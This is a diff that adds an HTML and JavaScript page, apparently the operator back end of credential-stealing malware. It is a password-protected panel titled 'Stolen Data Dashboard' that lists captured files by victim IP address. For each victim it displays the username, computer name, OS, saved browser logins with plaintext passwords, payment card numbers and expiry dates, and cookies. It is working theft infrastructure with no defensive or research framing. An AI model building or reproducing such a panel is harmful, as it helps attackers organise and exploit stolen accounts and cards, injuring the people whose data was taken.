@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            color: #fff;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .login-box {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            max-width: 400px;
+        }
+        
+        .login-box h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #00d9ff;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #aaa;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 16px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #00d9ff;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00d9ff 0%, #0099cc 100%);
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .error {
+            color: #ff6b6b;
+            text-align: center;
+            margin-top: 15px;
+        }
+        
+        .dashboard {
+            display: none;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            color: #00d9ff;
+        }
+        
+        .logout-btn {
+            padding: 10px 20px;
+            background: rgba(255, 107, 107, 0.3);
+            border: 1px solid #ff6b6b;
+            border-radius: 5px;
+            color: #ff6b6b;
+            cursor: pointer;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        
+        .stat-card h3 {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .stat-card .value {
+            font-size: 32px;
+            font-weight: bold;
+            color: #00d9ff;
+        }
+        
+        .data-table {
+            width: 100%;
+            border-collapse: collapse;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        
+        .data-table th,
+        .data-table td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .data-table th {
+            background: rgba(0, 217, 255, 0.2);
+            color: #00d9ff;
+        }
+        
+        .data-table tr:hover {
+            background: rgba(255, 255, 255, 0.1);
+        }
+        
+        .view-btn {
+            padding: 8px 16px;
+            background: rgba(0, 217, 255, 0.3);
+            border: 1px solid #00d9ff;
+            border-radius: 5px;
+            color: #00d9ff;
+            cursor: pointer;
+        }
+        
+        .view-btn:hover {
+            background: rgba(0, 217, 255, 0.5);
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        
+        .modal-content {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 90%;
+            max-height: 90%;
+            overflow: auto;
+            position: relative;
+        }
+        
+        .modal-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+        
+        .data-display {
+            background: #0d0d1a;
+            padding: 20px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            color: #00ff88;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .section-title {
+            color: #00d9ff;
+            margin: 20px 0 10px 0;
+            padding-bottom: 5px;
+            border-bottom: 1px solid rgba(0, 217, 255, 0.3);
+        }
+        
+        .info-item {
+            margin: 5px 0;
+            color: #ccc;
+        }
+        
+        .info-item strong {
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-container" id="loginContainer">
+            <div class="login-box">
+                <h2>🔐 Admin Login</h2>
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="password" placeholder="Enter password" required>
+                    </div>
+                    <button type="submit" class="btn">Login</button>
+                    <div class="error" id="loginError"></div>
+                </form>
+            </div>
+        </div>
+        
+        <div class="dashboard" id="dashboard">
+            <div class="header">
+                <h1>📊 Stolen Data Dashboard</h1>
+                <button class="logout-btn" onclick="logout()">Logout</button>
+            </div>
+            
+            <div class="stats">
+                <div class="stat-card">
+                    <h3>Total Files</h3>
+                    <div class="value" id="totalFiles">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>Unique IPs</h3>
+                    <div class="value" id="uniqueIPs">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>Total Size</h3>
+                    <div class="value" id="totalSize">0 KB</div>
+                </div>
+            </div>
+            
+            <h2 style="margin-bottom: 20px; color: #00d9ff;">📁 Captured Data</h2>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>IP Address</th>
+                        <th>Date</th>
+                        <th>Size</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTable">
+                </tbody>
+            </table>
+        </div>
+    </div>
+    
+    <div class="modal" id="dataModal">
+        <div class="modal-content">
+            <button class="modal-close" onclick="closeModal()">×</button>
+            <div id="modalBody"></div>
+        </div>
+    </div>
+    
+    <script>
+        let authToken = localStorage.getItem('authToken');
+        
+        function init() {
+            if (authToken) {
+                checkAuth();
+            }
+        }
+        
+        async function checkAuth() {
+            try {
+                const res = await fetch('/api/admin', {
+                    headers: { 'Authorization': `Bearer ${authToken}` }
+                });
+                const data = await res.json();
+                
+                if (data.authenticated) {
+                    showDashboard();
+                    loadData();
+                } else {
+                    localStorage.removeItem('authToken');
+                    authToken = null;
+                }
+            } catch (e) {
+                localStorage.removeItem('authToken');
+                authToken = null;
+            }
+        }
+        
+        function showDashboard() {
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+        }
+        
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const password = document.getElementById('password').value;
+            
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ password })
+                });
+                
+                const data = await res.json();
+                
+                if (data.success) {
+                    authToken = data.token;
+                    localStorage.setItem('authToken', authToken);
+                    showDashboard();
+                    loadData();
+                    document.getElementById('loginError').textContent = '';
+                } else {
+                    document.getElementById('loginError').textContent = data.message;
+                }
+            } catch (e) {
+                document.getElementById('loginError').textContent = 'Connection error';
+            }
+        });
+        
+        async function loadData() {
+            try {
+                const res = await fetch('/api/data', {
+                    headers: { 'Authorization': `Bearer ${authToken}` }
+                });
+                
+                if (!res.ok) {
+                    localStorage.removeItem('authToken');
+                    window.location.reload();
+                    return;
+                }
+                
+                const data = await res.json();
+                const tbody = document.getElementById('dataTable');
+                tbody.innerHTML = '';
+                
+                const uniqueIPs = new Set();
+                let totalSize = 0;
+                
+                data.files.forEach(file => {
+                    uniqueIPs.add(file.ip);
+                    totalSize += file.size;
+                    
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${file.ip}</td>
+                        <td>${new Date(file.date).toLocaleString()}</td>
+                        <td>${(file.size / 1024).toFixed(2)} KB</td>
+                        <td><button class="view-btn" onclick="viewData('${file.filename}')">View</button></td>
+                    `;
+                    tbody.appendChild(row);
+                });
+                
+                document.getElementById('totalFiles').textContent = data.files.length;
+                document.getElementById('uniqueIPs').textContent = uniqueIPs.size;
+                document.getElementById('totalSize').textContent = `${(totalSize / 1024).toFixed(2)} KB`;
+            } catch (e) {
+                console.error('Error loading data:', e);
+            }
+        }
+        
+        async function viewData(filename) {
+            try {
+                const res = await fetch(`/api/data/${filename}`, {
+                    headers: { 'Authorization': `Bearer ${authToken}` }
+                });
+                
+                const data = await res.json();
+                const modalBody = document.getElementById('modalBody');
+                
+                if (data.data) {
+                    const d = data.data;
+                    let html = '';
+                    
+                    html += '<h2 class="section-title">🖥️ System Info</h2>';
+                    html += '<div class="info-item"><strong>Username:</strong> ' + (d.system_info?.username || 'N/A') + '</div>';
+                    html += '<div class="info-item"><strong>Computer:</strong> ' + (d.system_info?.computer_name || 'N/A') + '</div>';
+                    html += '<div class="info-item"><strong>OS:</strong> ' + (d.system_info?.os || 'N/A') + '</div>';
+                    html += '<div class="info-item"><strong>Timestamp:</strong> ' + (d.timestamp || 'N/A') + '</div>';
+                    
+                    if (d.browsers) {
+                        for (const [browser, browserData] of Object.entries(d.browsers)) {
+                            html += `<h2 class="section-title">🌐 ${browser.toUpperCase()}</h2>`;
+                            
+                            if (browserData.logins && browserData.logins.length > 0) {
+                                html += '<h3 style="color: #00ff88; margin: 15px 0 10px;">🔑 Logins (' + browserData.logins.length + ')</h3>';
+                                browserData.logins.forEach(login => {
+                                    html += `<div style="background: rgba(255,255,255,0.05); padding: 10px; margin: 5px 0; border-radius: 5px;">`;
+                                    html += `<div class="info-item"><strong>URL:</strong> ${login.url || login.hostname || 'N/A'}</div>`;
+                                    html += `<div class="info-item"><strong>Username:</strong> ${login.username || 'N/A'}</div>`;
+                                    html += `<div class="info-item"><strong>Password:</strong> ${login.password || 'N/A'}</div>`;
+                                    html += '</div>';
+                                });
+                            }
+                            
+                            if (browserData.payments && browserData.payments.length > 0) {
+                                html += '<h3 style="color: #ffcc00; margin: 15px 0 10px;">💳 Payment Cards (' + browserData.payments.length + ')</h3>';
+                                browserData.payments.forEach(card => {
+                                    html += `<div style="background: rgba(255,255,255,0.05); padding: 10px; margin: 5px 0; border-radius: 5px;">`;
+                                    html += `<div class="info-item"><strong>Name:</strong> ${card.name || 'N/A'}</div>`;
+                                    html += `<div class="info-item"><strong>Number:</strong> ${card.number || 'N/A'}</div>`;
+                                    html += `<div class="info-item"><strong>Expiry:</strong> ${card.expiry || 'N/A'}</div>`;
+                                    html += '</div>';
+                                });
+                            }
+                            
+                            if (browserData.cookies && browserData.cookies.length > 0) {
+                                html += '<h3 style="color: #ff69b4; margin: 15px 0 10px;">🍪 Cookies (' + browserData.cookies.length + ')</h3>';
+                                html += '<div class="data-display">' + JSON.stringify(browserData.cookies, null, 2) + '</div>';
+                            }
+                        }
+                    }
+                    
+                    modalBody.innerHTML = html;
+                } else {
+                    modalBody.innerHTML = '<div class="data-display">' + JSON.stringify(data, null, 2) + '</div>';
+                }
+                
+                document.getElementById('dataModal').style.display = 'flex';
+            } catch (e) {
+                alert('Error loading data: ' + e.message);
+            }
+        }
+        
+        function closeModal() {
+            document.getElementById('dataModal').style.display = 'none';
+        }
+        
+        function logout() {
+            localStorage.removeItem('authToken');
+            window.location.reload();
+        }
+        
+        document.getElementById('dataModal').addEventListener('click', (e) => {
+            if (e.target.id === 'dataModal') {
+                closeModal();
+            }
+        });
+        
+        init();
+    </script>
+</body>
+</html>
